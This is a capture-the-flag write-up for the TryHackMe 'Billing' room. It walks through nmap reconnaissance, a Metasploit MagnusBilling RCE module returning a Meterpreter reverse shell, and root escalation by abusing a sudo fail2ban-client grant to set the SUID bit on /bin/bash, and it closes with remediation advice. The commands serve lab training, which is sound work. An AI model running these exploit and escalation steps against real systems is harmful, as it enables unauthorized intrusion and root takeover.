# CTF Write-up: Billing — TryHackMe

| | |
|---|---|
| **Platform**   | TryHackMe |
| **Machine**    | Billing |
| **Difficulty** | Easy |
| **Tags**       | `MagnusBilling` `RCE` `Metasploit` `fail2ban` `SUID` |

---

## Introduction

Billing is a room about outdated software and poor sudo configuration — a combination that shows up surprisingly often in real-world penetration tests. The target runs MagnusBilling, a VoIP billing platform, which has a known remote code execution vulnerability. Once inside, the privilege escalation path winds through fail2ban in a clever but absolutely exploitable way.

---

## Step 1 — Reconnaissance (Nmap)

Full port scan to start:

```bash
nmap -p0- <target-ip>
nmap -sV -p22,80,3306,5038 <target-ip>
```

Four interesting ports:

- **Port 22** — SSH
- **Port 80** — HTTP (MagnusBilling web interface)
- **Port 3306** — MySQL/MariaDB
- **Port 5038** — Asterisk Manager Interface (AMI)

The web app on port 80 redirected to `/mbilling` — the MagnusBilling panel. Bruteforcing was off-limits per the room's note, so I focused on finding a public exploit.

---

## Step 2 — Exploitation (MagnusBilling RCE)

Searching Metasploit for MagnusBilling:

```bash
msfconsole
search magnusbilling
```

A PHP-based RCE module came up — exactly what we needed.

```bash
use 5   # (or the relevant module number)
options
```

The module had `/mbilling` already set as the default URI path, matching what we saw on the web server. Set the required fields:

```bash
set RHOSTS <target-ip>
set LHOST <your-ip>

run
```

The module exploited the vulnerability and returned a Meterpreter shell. We landed as the `asterisk` service account.

---

## Step 3 — User Flag

Explored the filesystem from the Meterpreter session. Navigated to `/home` and found a user directory:

```bash
cd /home
ls
```

Found a user called `magnus`. Stepped in:

```bash
cd magnus
cat user.txt
```

> **FLAG:** `[user flag here]`

---

## Step 4 — Privilege Escalation (fail2ban SUID)

Spawned a proper shell and ran `sudo -l`:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
sudo -l
```

Output showed the `asterisk` user could run `fail2ban-client` as root with no password:

```
(root) NOPASSWD: /usr/bin/fail2ban-client
```

Checked which jails were active:

```bash
sudo /usr/bin/fail2ban-client status
```

Several jails were listed including `asterisk-iptables`. The goal: modify the `actionban` directive so that when an IP gets banned, fail2ban runs a command as root. Checked for writable files:

```bash
find /etc/fail2ban/ -writable 2>/dev/null
```

The `action.d` directory was writable, specifically:

```
/etc/fail2ban/action.d/iptables-multiport.conf
```

Edited the `actionban` line to set the SUID bit on `/bin/bash`:

```ini
actionban = chmod +s /bin/bash
```

Set the action for the `asterisk-iptables` jail:

```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports actionban "chmod +s /bin/bash"
```

Triggered the ban by banning an external IP (Google's DNS works fine for this — it's not actually harmed):

```bash
sudo /usr/bin/fail2ban-client set asterisk-iptables banip 8.8.8.8
```

The `actionban` fired. Checked `/bin/bash`:

```bash
ls -la /bin/bash
# (SUID bit now set)

/bin/bash -p

whoami
# root
```

---

## Step 5 — Root Flag

```bash
cat /root/root.txt
```

> **FLAG:** `[root flag here]`

---

## Summary & Takeaways

A clean two-stage compromise:

1. Outdated MagnusBilling with a public PHP RCE module in Metasploit.
2. `fail2ban-client` sudo permission + writable `action.d` directory allowed modifying the ban action to set SUID on `/bin/bash`.

The fix is simple on both counts: keep billing software updated and never grant sudo access to security tools (like fail2ban) unless the full configuration directory is properly locked down.
